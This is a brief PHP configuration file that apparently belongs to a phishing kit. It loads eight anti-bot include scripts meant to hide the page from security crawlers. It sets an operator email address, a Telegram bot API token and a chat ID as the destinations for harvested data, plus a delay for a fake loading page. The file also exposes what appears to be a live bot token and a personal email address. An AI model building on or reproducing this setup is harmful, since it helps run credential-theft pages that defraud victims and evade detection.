<?php


include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';



$Email = "axsam786@gmail.com"; // your Email

$api = "6964661629:AAF_vVKdEiMpEFrb0pM-9L8s3DDTDnAlXOI"; // your bot API

$chatid = "6892729812"; // your chatId

$loading_time = "3"; // waiting time in loading page in seconds


?>